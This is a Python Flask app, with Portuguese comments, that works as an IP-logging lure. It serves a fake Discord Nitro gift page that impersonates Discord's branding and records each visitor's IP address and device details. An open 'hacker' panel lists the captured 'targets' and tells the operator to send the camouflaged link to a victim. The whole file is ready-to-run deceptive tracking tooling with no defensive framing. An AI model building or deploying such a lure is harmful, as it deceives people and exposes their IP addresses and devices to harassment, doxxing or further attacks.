import os
import json
from datetime import datetime
from flask import Flask, request, render_template_string

app = Flask(__name__)

LOGS_FILE = "logs.json"

def carregar_logs():
    if os.path.exists(LOGS_FILE):
        try:
            with open(LOGS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return []
    return []

def salvar_log(dados):
    logs = carregar_logs()
    logs.insert(0, dados)
    with open(LOGS_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, ensure_ascii=False, indent=2)

# Template HTML da página falsa do Discord (Nitro Expirado)
DISCORD_NITRO_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord | Your Gift Is Here</title>
    <style>
        body {
            background-color: #313338;
            color: #dbdee1;
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            background-color: #2b2d31;
            padding: 40px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
            max-width: 420px;
            width: 100%;
        }
        .nitro-img {
            width: 100px;
            height: 100px;
            margin-bottom: 20px;
        }
        h2 {
            color: #f2f3f5;
            font-size: 22px;
            margin-bottom: 10px;
        }
        p {
            font-size: 14px;
            color: #949ba4;
            line-height: 20px;
            margin-bottom: 24px;
        }
        .btn {
            background-color: #5865f2;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 3px;
            cursor: pointer;
            width: 100%;
            text-decoration: none;
            display: inline-block;
            box-sizing: border-box;
        }
        .btn:hover {
            background-color: #4752c4;
        }
    </style>
</head>
<body>
    <div class="container">
        <svg class="nitro-img" viewBox="0 0 127.14 96.36" fill="#5865f2">
            <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.79,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.81,11.1,105.25,105.25,0,0,0,32.25-16.15c2.63-27.23-4.53-51.37-20.45-72.15ZM42.45,65.69C36.18,65.69,31,60,31,53s5.18-12.72,11.45-12.72S53.9,46,53.9,53,48.71,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.2,60,73.2,53s5.18-12.72,11.45-12.72S96.14,46,96.14,53,90.95,65.69,84.69,65.69Z"/>
        </svg>
        <h2>Gift Link Has Expired</h2>
        <p>This gift link has either been already claimed or has expired.</p>
        <a href="https://discord.com/login" class="btn">Login to Discord</a>
    </div>
</body>
</html>
"""

# Template HTML do Painel Hacker Estilizado
PANEL_HTML = """
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CYBER_LOG // Terminal Interface</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        body {
            background-color: #050505;
            color: #00ff66;
            font-family: 'Share Tech Mono', monospace;
            margin: 0;
            padding: 20px;
            overflow-x: hidden;
        }
        /* Efeito de scanline (linhas de monitor antigo) */
        body::before {
            content: " ";
            display: block;
            position: fixed;
            top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            z-index: 99999;
            background-size: 100% 4px, 6px 100%;
            pointer-events: none;
        }
        .container { max-width: 1100px; margin: 0 auto; }
        header {
            border-bottom: 2px dashed #00ff66;
            padding-bottom: 15px;
            margin-bottom: 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        h1 { margin: 0; font-size: 26px; text-shadow: 0 0 10px rgba(0,255,102,0.6); }
        .status-online { color: #00ff66; font-size: 14px; animation: blink 1.5s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }

        .card {
            background: rgba(0, 20, 10, 0.4);
            border: 1px solid #00ff66;
            padding: 20px;
            border-radius: 4px;
            margin-bottom: 25px;
            box-shadow: 0 0 15px rgba(0, 255, 102, 0.15);
        }
        h3 { margin-top: 0; color: #fff; border-left: 4px solid #00ff66; padding-left: 10px; }
        .link-box {
            background: #000;
            border: 1px dashed #00ff66;
            padding: 12px;
            font-size: 16px;
            color: #00ff66;
            word-break: break-all;
            letter-spacing: 1px;
        }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th, td { border: 1px solid #004411; padding: 12px; text-align: left; font-size: 14px; }
        th { background: #002208; color: #00ff66; text-transform: uppercase; letter-spacing: 1px; }
        tr:hover { background: rgba(0, 255, 102, 0.05); }
        .ip-highlight { color: #ff0055; font-weight: bold; text-shadow: 0 0 5px rgba(255,0,85,0.4); }
        .footer { text-align: center; font-size: 12px; color: #008833; margin-top: 40px; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>[SYS_ROOT] // IP_LOGGER_MATRIX</h1>
            <div class="status-online">● STATUS: SECURE / LISTENING</div>
        </header>

        <div class="card">
            <h3>ACTIVE_TRACKING_URL</h3>
            <div class="link-box" id="track-link">INITIALIZING...</div>
            <p style="font-size: 13px; color: #88cc99; margin-top: 10px;">> Envie este link camuflado para o alvo. Os dados serão interceptados em tempo real.</p>
        </div>
        
        <div class="card">
            <h3>INTERCEPTED_TARGETS (LOGS)</h3>
            <table>
                <thead>
                    <tr>
                        <th>TIMESTAMP</th>
                        <th>TARGET_IP</th>
                        <th>USER_AGENT / DEVICE INFO</th>
                    </tr>
                </thead>
                <tbody>
                    {% for log in logs %}
                    <tr>
                        <td>{{ log.data }}</td>
                        <td class="ip-highlight">{{ log.ip }}</td>
                        <td>{{ log.user_agent }}</td>
                    </tr>
                    {% else %}
                    <tr>
                        <td colspan="3" style="text-align:center; color: #446655;">[ NENHUM SINAL CAPTURADO AINDA ]</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>

        <div class="footer">
            SECURE ACCESS TERMINAL // ENCRYPTION: AES-256
        </div>
    </div>

    <script>
        document.getElementById('track-link').innerText = window.location.origin + '/nitro/nitro_boost_xyz99';
    </script>
</body>
</html>
"""

@app.route('/nitro/<path:subpath>')
def nitro_fake(subpath):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    user_agent = request.headers.get('User-Agent', 'Desconhecido')
    data_hora = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    salvar_log({
        "ip": ip,
        "user_agent": user_agent,
        "data": data_hora
    })

    return render_template_string(DISCORD_NITRO_HTML)

@app.route('/painel')
def painel():
    logs = carregar_logs()
    return render_template_string(PANEL_HTML, logs=logs)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
